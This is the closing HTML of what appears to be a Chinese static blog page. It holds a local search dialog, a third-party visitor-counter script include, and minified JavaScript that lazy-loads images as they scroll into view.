</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>